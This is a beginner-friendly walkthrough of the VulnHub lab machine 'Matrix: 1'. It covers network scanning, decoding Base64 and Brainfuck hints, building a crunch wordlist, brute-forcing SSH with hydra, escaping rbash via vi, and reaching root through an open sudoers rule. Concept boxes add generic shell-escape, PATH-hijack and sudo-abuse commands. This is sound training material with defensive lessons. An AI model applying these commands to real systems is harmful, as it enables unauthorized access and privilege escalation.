# Matrix: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Matrix: 1 |
| **Difficulty** | Intermediate |
| **Author** | Ajay Verma |
| **Released** | 2018-08-19 |
| **VulnHub Entry** | <https://vulnhub.com/entry/matrix-1,259/> |
| **Download** | <https://vulnhub.com/entry/matrix-1,259/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux |

> A "follow the white rabbit" boot2root. The theme is decoders and rabbit holes:
> the web pages hide a hint as **Base64**, that hint points to a file written in
> **Brainfuck**, and the decoded file gives you a partial SSH password that you
> rebuild with `crunch`. After logging in you escape a **restricted shell**
> (`rbash`) and find `sudo` is wide open. Everything is a decode/reasoning
> puzzle, not a memory-corruption exploit. Filenames and prompts can vary
> slightly between builds of the OVA.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target and scan it with `nmap`.
- How to read HTML **source code**, not just the rendered page, for hidden hints.
- How to recognise and decode **Base64** and **Brainfuck**.
- How to generate a targeted wordlist with `crunch` when part of a password is known.
- How to brute-force **SSH** with `hydra`.
- How to escape a **restricted bash shell (`rbash`)** using `vi`.
- How a loose **`sudoers`** entry leads to full `root` access.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the "eth0" adapter is the lab NIC)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** the lab NIC holds a `192.168.56.x` (VirtualBox host-only)
> or `192.168.19x.x` (VMware) address. The target is on the **same** subnet.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# Two equivalent, fast ways to find live hosts on the subnet
sudo netdiscover -r 192.168.56.0/24
# or:
sudo arp-scan --interface=eth0 --localnet
```

```text
Currently scanning: 192.168.56.0/24
 192.168.56.1    0a:00:27:00:00:00  ...
 192.168.56.101  08:00:27:4d:5e:6f  ...  <-- our target
```

> **Why it works:** `netdiscover` and `arp-scan` broadcast ARP requests and list
> every machine that replies. ARP is layer 2, so it finds hosts even if they
> block ping.

**Target IP:** `192.168.56.101`

![netdiscover finding Matrix at 192.168.56.101](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

> **Goal:** find open ports and services, then enumerate the web apps.


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80,31337 -oA scans/services 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00050s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
31337/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

> **How to read it:** three attack surfaces — SSH (22), a normal web server (80),
> and a **second web server on an unusual high port (31337)**. Non-standard
> ports are almost always deliberately placed by the challenge author.

### 2.1 The rabbit hole on port 80

```bash
curl -s http://192.168.56.101/ | head -40
```

```text
<html>
  ...
  <body>
    <h1>Follow the White Rabbit.</h1>
    <img src="images/white_rabbit.jpg:31337">
  </body>
</html>
```

> **Why it works:** the image `src` is malformed — it references port `31337`.
> The author is telling you to go look at the *other* web server.

### 2.2 The hidden Base64 on port 31337

```bash
curl -s http://192.168.56.101:31337/ | grep -i "base64\|<!--"
```

```text
<!-- ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg= -->
```

> **Why it works:** the HTML comment holds a **Base64** string. Base64 is just a
> way to encode arbitrary bytes as text; it is trivially reversible. Decode it:


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d
```

```text
echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
```

> **How to read it:** the decoded text is a shell command that *creates a file*
> named `Cypher.matrix`. So the author is hinting there is a file called
> `Cypher.matrix` we should fetch.

![decoding the Base64 comment](images/02-enum.png)

### 2.3 Fetch and decode `Cypher.matrix` (Brainfuck)

```bash
curl -s http://192.168.56.101:31337/Cypher.matrix -o Cypher.matrix
file Cypher.matrix
head -c 200 Cypher.matrix; echo
```

```text
Cypher.matrix: ASCII text
+++++ ++++[ ->+++ +++++ +++++ ...
```

> **Why it works:** a block of only `+ - < > . , [ ]` characters is the
> **Brainfuck** esoteric language. Its output is text you can read. Decode it
> online (e.g. <https://copy.sh/brainfuck/>) or with a local interpreter:

```bash
# One example of a local decoder (any Brainfuck interpreter produces the same text)
beef Cypher.matrix 2>/dev/null || echo "use https://copy.sh/brainfuck/ and paste the file"
```

```text
You can enter into matrix as guest, with password k1ll0rXX
Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
```

> **How to read it:** the username is `guest` and the password is `k1ll0r`
> plus **two unknown characters**. We will brute-force only those two.

---

## 3. Foothold

> **Goal:** turn the partial password into an SSH shell.

### 3.1 Generate the candidate passwords with `crunch`


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
# 8-char words: "k1ll0r" + one digit (%) + one lowercase letter (@)
crunch 8 8 -t k1ll0r%@ -o dict.txt
head -3 dict.txt; wc -l dict.txt
```

```text
k1ll0r00
k1ll0r01
k1ll0r02
260
```

> **Why it works:** `-t k1ll0r%@` builds a pattern. `%` is replaced by every
> digit `0-9`, `@` by every lowercase letter `a-z`. That is only
> `10 × 26 = 260` candidates — small enough to try in seconds.

### 3.2 Brute-force SSH with `hydra`


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
hydra -l guest -P dict.txt ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: guest   password: k1ll0r7n
1 of 1 target successfully completed, 1 valid password found
```

> **Why it works:** `hydra` opens a fresh SSH connection per candidate and looks
> for a successful authentication. Because we cut the search space from
> billions of passwords down to 260, it finishes almost instantly.

```bash
ssh guest@192.168.56.101
# password: k1ll0r7n
```

```text
guest@matrix:~$
```

![hydra finding guest:k1ll0r7n and the SSH login](images/04-foothold.png)

### 3.3 Escape the restricted shell (`rbash`)

Try a normal command:

```bash
ls
```


> ### 📖 Concept — Escaping a restricted shell
>
> **`rbash`** (restricted bash) is bash started with `--restricted`. It blocks:
> changing directory (`cd`), setting or unsetting `SHELL`/`PATH`/`ENV`/`BASH_ENV`,
> command names containing `/`, output redirection with `>`, and `exec`/`source` of
> absolute paths.
>
> It is a *shell* restriction, not a security boundary — it only constrains that one
> process. **Anything that spawns a fresh shell escapes it.** Work through these:
>
> ```bash
> # 1. Does any permitted command spawn a shell?
> vim -c ':!sh'            # or :set shell=/bin/bash  then :shell
> less /etc/passwd         # then type !sh
> more, man (then !sh), ftp (!/bin/sh), gdb (-ex '!sh'), awk ('BEGIN{system("/bin/sh")}')
> find . -exec /bin/sh \; -quit
>
> # 2. Can you run an interpreter at all?
> python -c 'import os; os.system("/bin/sh")'
> perl -e 'exec "/bin/sh";'
> php -r "system('/bin/sh');"
>
> # 3. Is SSH available with a command override?
> ssh user@target -t "/bin/sh"          # -t forces a tty, bypassing the login shell
> ssh user@target -t "bash --noprofile --norc"
>
> # 4. Is the restriction only in the profile?
> bash --noprofile --norc               # a clean, unrestricted bash
> export SHELL=/bin/bash                # if you can reach env at all
>
> # 5. Can you write a file and execute it another way?
> echo '/bin/sh' > /tmp/x.sh            # redirection is often blocked — try tee
> ```
>
> **Check what you actually have first.** `echo $0` shows the shell; `set -o` lists
> options (look for `restricted on`); `echo $PATH` shows whether it is pinned;
> `compgen -c | head -50` lists runnable commands.
>
> **The general principle:** a restricted shell limits *one process*. Find any child
> process it lets you create, and the restriction does not apply there.
>
> **Deep dive:** [CONCEPTS §12 — Shells](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```text
-rbash: ls: command not found
```

> **How to read it:** the prompt works, but `ls`, `cd`, `/bin/bash` … are all
> denied. This is **`rbash`** — a restricted Bash that limits `PATH` and blocks
> commands containing `/`. We were placed here on purpose.

Use `vi` (which the author left in the restricted `PATH`) to launch a full shell:

```bash
vi
# inside vi press:  :set shell=/bin/bash
# then press:       :shell
```

```text
guest@matrix:~$    # now a real bash prompt
```

> **Why it works:** `vi` can spawn a sub-shell with `:shell`. Because that
> sub-shell is **not** restricted, we have escaped `rbash`. Fix the environment:


> ### 📖 Concept — PATH hijacking
>
> When a program runs another program **by name only** (`service`, `tar`, `python`)
> rather than by absolute path, the shell searches each directory in `$PATH` **left to
> right** and executes the first match it finds. If you can place a file earlier in
> that search order, you control what runs.
>
> This matters when the calling program is **root-owned** — a cron job, a SUID binary,
> or a startup script:
>
> ```bash
> mkdir -p /tmp/evil
> printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n' > /tmp/evil/service
> chmod +x /tmp/evil/service
> export PATH=/tmp/evil:$PATH
> # wait for the root job to run, then:
> /tmp/rootbash -p
> ```
>
> **Find the opportunity** by inspecting what the privileged program actually calls:
>
> ```bash
> strace -f -e trace=execve /usr/local/bin/script.sh 2>&1 | grep execve
> strings /usr/local/bin/script.sh | grep -E 'system\(|popen\(|exec'
> ```
>
> An `execve("service", ...)` with **no leading `/`** is the vulnerability. A fully
> qualified `/usr/sbin/service` is not.
>
> **Check cron's own PATH first** — `/etc/crontab` usually sets
> `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`, and
> `sudo`'s `secure_path` overrides yours entirely. If `/tmp` cannot get into that
> list, look instead for a writable directory that is *already* in it —
> `/usr/local/bin` very often is.
>
> **Deep dive:** [CONCEPTS §15.8 — PATH hijacking](../../docs/CONCEPTS.md#158-path-hijacking)

```bash
export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:$PATH
```

### 3.4 Full-fledged shell (optional)


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   ; and:  export TERM=xterm
```

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

> **Goal:** go from `guest` to `root`.

Check what `guest` can run as another user:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
Matching Defaults entries for guest on matrix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User guest may run the following commands on matrix:
    (ALL : ALL) ALL
```

> **Why it works:** `(ALL : ALL) ALL` means `guest` may run **anything** as
> **any** user (including `root`) after typing their own password. This is a
> deliberately bad `sudoers` configuration.

```bash
sudo su
# password: k1ll0r7n
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

An even cleaner version keeps a usable environment:

```bash
sudo -i          # or:  sudo /bin/bash -l
```

> **How to read it:** `sudo su` starts a root shell using `guest`'s password.
> The `id` output `uid=0` confirms we are now root.

### The root flag

```bash
cat /root/flag.txt
```

```text
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  ... flag contents ...        (varies by build)
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
```

![root shell and /root/flag.txt](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hint / credential disclosure in page source | HTML comment on port 31337 | Leaks the `Cypher.matrix` filename (Base64) |
| 2 | Partial password disclosure | `Cypher.matrix` (Brainfuck) | Username `guest` + 6 of 8 password chars |
| 3 | Weak/guessable SSH password | OpenSSH on port 22 | Easy brute-force to `guest:k1ll0r7n` |
| 4 | Restricted shell is escapable | `rbash` + `vi` in `PATH` | Full shell via `:shell` |
| 5 | Over-permissive sudoers | `guest (ALL : ALL) ALL` | Trivial full `root` access |

## 6. Defensive lessons (blue team)

- **Never leave hints or secrets in served files.** Base64 and Brainfuck are
  encodings, not security. Strip comments and encode nothing sensitive.
- **Enforce strong, unique passwords and disable SSH password auth** in favour of
  keys. Even when 6 of 8 characters leak, a strong password should still be
  unguessable — and a lockout policy would stop 260 attempts outright.
- **`rbash` is not a security boundary.** If you need confinement, use a proper
  jail/container and remove editors and shell-escape paths from `PATH`.
- **Fix `sudoers`:** grant the *specific* commands each user needs, never
  `(ALL : ALL) ALL`. Audit with `visudo -c` and monitor `sudo` logs.
- **Logging/detection:** alert on bursts of SSH authentication failures, on
  `sudo -l`/`sudo su` from unexpected accounts, and on the use of `vi`/`vim`
  sub-shell escapes in restricted contexts.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/matrix-1,259/>
- Community writeups consulted:
  - [Matrix 1: CTF walkthrough (Infosec Institute)](https://www.infosecinstitute.com/resources/capture-the-flag/matrix-1-ctf-walkthrough/)
  - [Getting root: Matrix (Armored Code)](https://armoredcode.com/blog/getting-root-matrix/)
  - [Vulnhub Matrix: 1 Walkthrough (fistfulofsecurity)](https://fistfulofsecurity.blogspot.com/2018/11/vulnhub-matrix-1-walkthrough.html)
  - [Matrix 1 – Vulnhub Walkthrough (Knight Squad)](https://blog.knightsquad.org/hacking/ctf-walkthrough/matrix-1-vulnhub-walkthrough/)
- Tools / references:
  - [Base64 (Wikipedia)](https://en.wikipedia.org/wiki/Base64)
  - [Brainfuck (Wikipedia)](https://en.wikipedia.org/wiki/Brainfuck)
  - [Online Brainfuck interpreter](https://copy.sh/brainfuck/)
  - [Hydra – THC](https://github.com/vanhauser-thc/thc-hydra)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`netdiscover` / `arp-scan`)
- [ ] `images/02-enum.png` — decoding the Base64 comment on port 31337
- [ ] `images/03-enum.png` — decoding `Cypher.matrix` (Brainfuck) to `guest:k1ll0rXX`
- [ ] `images/04-foothold.png` — `crunch` + `hydra` + SSH login as `guest`
- [ ] `images/05-shell.png` — escaping `rbash` with `vi` (`:shell`)
- [ ] `images/06-user-flag.png` — local enumeration as `guest`
- [ ] `images/07-privesc.png` — `sudo -l` showing `(ALL : ALL) ALL`
- [ ] `images/08-root-flag.png` — root shell and `/root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
